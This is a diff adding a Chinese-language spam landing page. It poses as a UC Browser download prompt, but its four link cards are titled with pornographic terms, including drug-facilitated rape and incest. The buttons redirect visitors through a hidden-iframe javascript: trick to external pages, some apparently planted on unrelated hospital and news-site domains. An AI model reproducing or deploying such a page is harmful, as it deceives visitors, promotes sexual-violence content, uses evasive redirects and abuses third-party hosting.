@@ -1,0 +1,557 @@
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>打不开时下载UC浏览器访问</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #4b6cb7 0%, #182848 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            transition: background-color 3s ease;
+        }
+        
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+            padding: 30px;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+            transition: all 2s ease;
+        }
+        
+        .title {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            border-radius: 18px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
+            transition: all 2s ease;
+        }
+        
+        .title::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0.1) 100%);
+        }
+        
+        .title .bg {
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.3);
+            letter-spacing: 1.5px;
+            position: relative;
+        }
+   
+        .image-section {
+            margin: 0 0 35px 0;
+            padding: 25px;
+            border-radius: 18px;
+            border: 3px dashed #4b6cb7;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            transition: all 2s ease;
+        }
+        
+        .image-section::before {
+            content: "图片展示区域";
+            position: absolute;
+            top: -15px;
+            left: 25px;
+            color: white;
+            padding: 6px 15px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+            transition: all 2s ease;
+        }
+        
+        .single-image {
+            width: 100%;
+            max-width: 800px;
+            height: 350px;
+            margin: 15px auto;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            transition: transform 0.5s ease;
+        }
+        
+        .single-image:hover {
+            transform: scale(1.02);
+        }
+        
+        .single-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .promotion-links {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin: 35px 0;
+            transition: all 2s ease;
+        }
+        
+        .promo-item {
+            border-radius: 16px;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            transition: all 2s ease;
+        }
+        
+        .promo-item::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            transition: all 2s ease;
+        }
+        
+        .promo-item:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .promo-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: all 2s ease;
+        }
+        
+        .promo-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+            transition: all 2s ease;
+        }
+        
+        .promo-desc {
+            font-size: 14px;
+            color: white;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            transition: all 2s ease;
+        }
+        
+        .promo-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            color: white;
+            border-radius: 50px;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border: none;
+            cursor: pointer;
+            transition: all 2s ease;
+        }
+        
+        .promo-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .qr-section {
+            margin: 30px 0;
+            padding: 25px;
+            border-radius: 18px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            transition: all 2s ease;
+        }
+        
+        .qr-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+            transition: all 2s ease;
+        }
+        
+        .qr-image-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .qr-image {
+            width: 200px;
+            height: 200px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        
+        .qr-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .qr-instructions {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 25px 0;
+            flex-wrap: wrap;
+        }
+        
+        .qr-instruction {
+            color: white;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: all 2s ease;
+        }
+        
+        @media (max-width: 992px) {
+            .promotion-links {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .title .bg {
+                font-size: 24px;
+            }
+            
+            .single-image {
+                height: 250px;
+            }
+            
+            .promotion-links {
+                grid-template-columns: 1fr;
+            }
+            
+            .qr-instructions {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .qr-instruction {
+                width: 100%;
+                text-align: center;
+            }
+        }
+        
+        /* 隐藏的控制台信息样式 */
+        .hidden-info {
+            display: none;
+        }
+        
+        /* 初始化颜色 */
+        .title {
+            background: linear-gradient(90deg, #ff7e5f, #feb47b);
+        }
+        
+        .image-section {
+            background-color: #f8f9fa;
+        }
+        
+        .image-section::before {
+            background: linear-gradient(90deg, #4b6cb7, #6a82fb);
+        }
+        
+        .promo-item {
+            background: linear-gradient(145deg, #36d1dc, #5b86e5);
+        }
+        
+        .promo-item::before {
+            background: linear-gradient(90deg, #5b86e5, #36d1dc);
+        }
+        
+        .promo-icon {
+            background: linear-gradient(135deg, #ff7e5f, #feb47b);
+        }
+        
+        .promo-btn {
+            background: linear-gradient(90deg, #4b6cb7, #6a82fb);
+        }
+        
+        .qr-section {
+            background: linear-gradient(145deg, #ff7e5f, #feb47b);
+        }
+        
+        .qr-instruction {
+            background: linear-gradient(90deg, #4b6cb7, #6a82fb);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">
+            <div class="bg">网址👉X36A.cc</div>
+        </div>
+        
+        <!-- 图片展示区域 - 放在顶部 -->
+        <div class="image-section">
+            <div class="single-image">
+                <!-- 这里替换为你自己的图片路径 -->
+                <img src="IMG_019.jpeg" alt="图片">
+            </div>
+            <p style="margin-top: 15px; color: #666; font-size: 14px; transition: color 2s ease;">此处为图片展示区域</p>
+        </div>
+        
+        <!-- 1×4推广链接区域 -->
+        <div class="promotion-links">
+            <div class="promo-item">
+                <div class="promo-icon">A</div>
+                <div class="promo-title">乱伦</div>
+                <div class="promo-desc">高速安全浏览器，极速上网体验</div>
+                <button class="promo-btn" onclick="tourl('https://jdzsdsrmyy.medical.platform.yungezhinengkeji.com/resource/CommonUploadFiles/2025121919/dcd212f0b501dc944ac05426328d0fe5.html#/?code=aubr96')">立即下载</button>
+            </div>
+            
+            <div class="promo-item">
+                <div class="promo-icon">B</div>
+                <div class="promo-title">换妻</div>
+                <div class="promo-desc">海量高清视频，流畅播放体验</div>
+                <button class="promo-btn" onclick="tourl('https://example.com/uc2')">立即体验</button>
+            </div>
+            
+            <div class="promo-item">
+                <div class="promo-icon">C</div>
+                <div class="promo-title">迷奸</div>
+                <div class="promo-desc">个性化资源推荐，掌握最新视频</div>
+                <button class="promo-btn" onclick="tourl('http://dsjhfgsdfdgs.cn/syb/')">立即查看</button>
+            </div>
+            
+            <div class="promo-item">
+                <div class="promo-icon">D</div>
+                <div class="promo-title">迷奸</div>
+                <div class="promo-desc">精品影院平台，流畅义观看视频</div>
+                <button class="promo-btn" onclick="tourl('https://mc-public-tz.taizhou.com.cn/87896997243868548326503263773188292.html?atecode=NTAxLERsYTJVLDY')">立即进入</button>
+            </div>
+        </div>
+        
+        <!-- 二维码区域 -->
+        <div class="qr-section">
+            <div class="qr-title">扫码访问</div>
+            <div class="qr-image-container">
+                <div class="qr-image">
+                    <!-- 这里替换为你自己的二维码图片路径 -->
+                    <img src="IMG_020.png" alt="二维码">
+                </div>
+            </div>
+            <div class="qr-instructions">
+                <div class="qr-instruction">截图保存</div>
+                <div class="qr-instruction">防止迷路</div>
+                <div class="qr-instruction">分享好友</div>
+            </div>
+        </div>
+        
+        <!-- 隐藏的自动更换背景色信息 -->
+        <div class="hidden-info" id="bg-timer-info">
+            页面所有容器内容每10分钟自动更换一次颜色（隐藏功能）
+        </div>
+    </div>
+
+    <script>
+        // 跳转函数
+        function tourl(url) {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'javascript:"<script>top.location.replace(\'' + url + '\')<\/script>"';
+            document.body.appendChild(iframe);
+        }
+        
+        // 颜色控制相关变量
+        let autoChangeInterval;
+        const changeInterval = 10 * 60 * 1000; // 10分钟
+        
+        // 初始化自动更换颜色（完全隐藏，不显示任何UI）
+        function initAutoColorChange() {
+            // 立即更换一次颜色
+            changeAllColors();
+            
+            // 设置定时器，每10分钟自动更换所有颜色
+            autoChangeInterval = setInterval(changeAllColors, changeInterval);
+            
+            // 只在控制台输出信息（用户看不到）
+            console.log('页面所有容器内容自动更换颜色功能已启动，每10分钟更换一次');
+        }
+        
+        // 生成随机颜色函数
+        function getRandomColor() {
+            const hue = Math.floor(Math.random() * 360);
+            const saturation = 60 + Math.floor(Math.random() * 30);
+            const lightness = 40 + Math.floor(Math.random() * 30);
+            return `hsl(${hue}, ${saturation}%, ${lightness}%)`;
+        }
+        
+        // 生成随机渐变色函数
+        function getRandomGradient(angle = 90) {
+            const hue1 = Math.floor(Math.random() * 360);
+            const hue2 = (hue1 + 60) % 360;
+            const saturation = 60 + Math.floor(Math.random() * 30);
+            const lightness = 40 + Math.floor(Math.random() * 30);
+            return `linear-gradient(${angle}deg, hsl(${hue1}, ${saturation}%, ${lightness}%), hsl(${hue2}, ${saturation}%, ${lightness - 10}%))`;
+        }
+        
+        // 生成随机渐变函数（带两个颜色）
+        function getRandomGradientWithTwoColors(angle = 90) {
+            const hue1 = Math.floor(Math.random() * 360);
+            const hue2 = Math.floor(Math.random() * 360);
+            const saturation = 60 + Math.floor(Math.random() * 30);
+            const lightness = 40 + Math.floor(Math.random() * 30);
+            return `linear-gradient(${angle}deg, hsl(${hue1}, ${saturation}%, ${lightness}%), hsl(${hue2}, ${saturation}%, ${lightness - 10}%))`;
+        }
+        
+        // 更换所有颜色函数
+        function changeAllColors() {
+            // 1. 更换页面背景色
+            const pageHue = Math.floor(Math.random() * 360);
+            const pageSaturation = 60 + Math.floor(Math.random() * 30);
+            const pageLightness = 40 + Math.floor(Math.random() * 30);
+            const pageColor1 = `hsl(${pageHue}, ${pageSaturation}%, ${pageLightness}%)`;
+            const pageColor2 = `hsl(${(pageHue + 60) % 360}, ${pageSaturation}%, ${pageLightness - 10}%)`;
+            document.body.style.background = `linear-gradient(135deg, ${pageColor1} 0%, ${pageColor2} 100%)`;
+            
+            // 2. 更换标题区域颜色
+            const titleElement = document.querySelector('.title');
+            if (titleElement) {
+                titleElement.style.background = getRandomGradient(90);
+            }
+            
+            // 3. 更换图片区域背景色
+            const imageSection = document.querySelector('.image-section');
+            if (imageSection) {
+                imageSection.style.backgroundColor = getRandomColor();
+                
+                // 更换图片区域标记颜色
+                const imageSectionBefore = getRandomGradient(90);
+                imageSection.style.setProperty('--before-bg', imageSectionBefore);
+            }
+            
+            // 4. 更换推广链接区域颜色
+            const promoItems = document.querySelectorAll('.promo-item');
+            promoItems.forEach(item => {
+                item.style.background = getRandomGradient(145);
+                
+                // 更换顶部条颜色
+                const beforeColor = getRandomGradientWithTwoColors(90);
+                item.style.setProperty('--before-bg', beforeColor);
+            });
+            
+            // 5. 更换推广链接图标颜色
+            const promoIcons = document.querySelectorAll('.promo-icon');
+            promoIcons.forEach(icon => {
+                icon.style.background = getRandomGradient(135);
+            });
+            
+            // 6. 更换推广链接标题颜色
+            const promoTitles = document.querySelectorAll('.promo-title');
+            promoTitles.forEach(title => {
+                title.style.color = getRandomColor();
+            });
+            
+            // 7. 更换推广链接描述颜色
+            const promoDescs = document.querySelectorAll('.promo-desc');
+            promoDescs.forEach(desc => {
+                desc.style.color = getRandomColor();
+            });
+            
+            // 8. 更换推广链接按钮颜色
+            const promoBtns = document.querySelectorAll('.promo-btn');
+            promoBtns.forEach(btn => {
+                btn.style.background = getRandomGradient(90);
+            });
+            
+            // 9. 更换二维码区域颜色
+            const qrSection = document.querySelector('.qr-section');
+            if (qrSection) {
+                qrSection.style.background = getRandomGradient(145);
+            }
+            
+            // 10. 更换二维码标题颜色
+            const qrTitle = document.querySelector('.qr-title');
+            if (qrTitle) {
+                qrTitle.style.color = getRandomColor();
+            }
+            
+            // 11. 更换二维码说明颜色
+            const qrInstructions = document.querySelectorAll('.qr-instruction');
+            qrInstructions.forEach(instruction => {
+                instruction.style.background = getRandomGradient(90);
+            });
+            
+            // 12. 更换图片区域文字颜色
+            const imageText = document.querySelector('.image-section p');
+            if (imageText) {
+                imageText.style.color = getRandomColor();
+            }
+            
+            // 只在控制台输出信息（用户看不到）
+            const now = new Date();
+            console.log(`页面所有容器颜色已更换 (${now.toLocaleTimeString()})，下一次更换将在10分钟后`);
+        }
+        
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            initAutoColorChange();
+            
+            // 为所有推广链接按钮添加点击事件
+            const promoBtns = document.querySelectorAll('.promo-btn');
+            promoBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    // 可以在这里添加点击统计代码
+                    console.log('推广链接被点击:', this.textContent);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
